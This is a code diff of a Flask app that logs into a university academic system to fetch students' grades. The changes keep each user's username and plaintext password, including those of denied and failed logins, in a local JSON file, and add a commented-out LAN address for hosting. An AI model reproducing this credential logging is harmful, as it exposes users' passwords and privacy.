@@ -42,7 +42,9 @@ def show_grade():
 
     allows = json.load(open('./static/allows.json', 'r'))
     if not str(username) in allows['allow_user']:
-        users[f'{time.time()}'] = {"name": f"{name}", 'username': username, 'password': password, "time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())}
+        users[f'{time.time()}'] = {"name": f"{name}", 'username': username, 'password': password,
+                                    "time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
+                                    "status": "fail"}
         json.dump(users, open(f'{file_path}', 'w', encoding="utf-8"), indent=4, ensure_ascii=False)
         return redirect(url_for('notallow'))
     
@@ -51,7 +53,9 @@ def show_grade():
         if '学分制综合教务' in response.text:
             name, result = get_grades(session)
             count = len(result['courseName'])
-            users[f'{time.time()}'] = {"name": f"已授权用户 ==> {name}", 'username': username, 'password': password, "time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())}
+            users[f'{time.time()}'] = {"name": f"已授权用户 ==> {name}", 'username': username, 'password': password,
+                                        "time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
+                                        "status": "success"}
             json.dump(users, open(f'{file_path}', 'w', encoding='utf-8'), indent=4, ensure_ascii=False)
             break
         else:
@@ -59,6 +63,11 @@ def show_grade():
             print(f"验证码输入错误,正在重新识别, 还剩{10 - tmp_flag}次机会...")
             if tmp_flag == 10:
                 print('请检查账号密码是否正确？网页是否维护中...')
+                name = "密码错误"
+                users[f'{time.time()}'] = {"name": f"已授权用户 ==> {name}", 'username': username, 'password': password,
+                                        "time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
+                                        "status": "fail"}
+                json.dump(users, open(f'{file_path}', 'w', encoding='utf-8'), indent=4, ensure_ascii=False)
 
                 return redirect(url_for('error'))
     
@@ -91,9 +100,12 @@ def  startEval():
 
 if __name__ == '__main__':
     import webbrowser, threading
+    url = "http://127.0.0.1:5000"
+    # url = "http://172.23.17.70:5000"
     def open_browser():
-        webbrowser.open("http://127.0.0.1:5000")
+        webbrowser.open(url)
 
     threading.Timer(2, open_browser).start()
     app.run(host='127.0.0.1', port=5000)
+    # app.run(host='172.23.17.70', port=5000)
     
